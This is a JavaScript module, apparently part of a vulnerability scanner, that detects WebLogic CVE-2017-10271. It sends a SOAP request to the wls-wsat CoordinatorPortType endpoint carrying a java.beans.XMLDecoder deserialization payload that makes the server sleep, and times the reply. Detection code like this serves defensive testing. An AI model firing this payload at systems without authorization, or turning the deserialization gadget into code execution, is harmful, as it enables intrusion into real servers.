module.exports={
	tags:"weblogic,CVE-2017-10271,10271",
	des:"CVE-2017-10271,weblogic CVE-2017-10271漏洞检测",
	VulApps:[
		"https://nvd.nist.gov/vuln/detail/CVE-2017-10271"],
	urls:[
		"https://nvd.nist.gov/vuln/detail/CVE-2017-10271"],
	suport:g_szMyMsg,
	doCheck:function (url,fnCbk)
	{
		var _t = this, szOld = url;
		// CoordinatorPortType
		// CoordinatorPortType11
		url = url.substr(0, url.indexOf('/',13)) + '/wls-wsat/CoordinatorPortType';
		var s = fnMyHelp(function(){
/*
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
  <soapenv:Header>
 <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
  <java version="1.8.0_131" class="java.beans.XMLDecoder">
		<void class="java.lang.Thread">
		  	<void method="sleep">	
		  		<long>{num}</long>
		  	</void>
		</void>
</java>
</work:WorkContext>
</soapenv:Header>
<soapenv:Body/>
</soapenv:Envelope>
*/});
		var nNum = new Date().getTime()/1000,nTime = (parseInt(Math.random() * 1000000000)%18 + 15) * 1000;
		s = s.replace(/\{num\}/gmi, nTime).replace(/>\s*</gmi,'><').replace(/[\t\r]/gmi,'');
		// console.log([s, nTime,url]);
		// console.log(nTime);
		console.log(new Date().toString());
		request(fnOptHeader({
			timeout: nTime + 5000,
			method: 'POST',
			uri: url,
			body:s
		    ,headers:
		    {
		    	"Host":'127.0.0.1:7001',
		    	"User-Agent": g_szUa,
		    	"content-type":"text/xml"
		    }})
		  , function (error, response, body){
		  		console.log(new Date().toString());
		  		console.log([nTime, new Date().getTime()/1000 - nNum,s,url,body]);
		  		if(body)
		  		{
		  			// console.log(body);
		  			fnDoBody(body,"CVE-2017-10271",url,null,function(o)
			    	{
			    		var r = {"url":szOld,"send":s};
		  				fnCbk(global.copyO2O(r,o),_t);
			    	});
		  		}
		    }
		 );
	}
};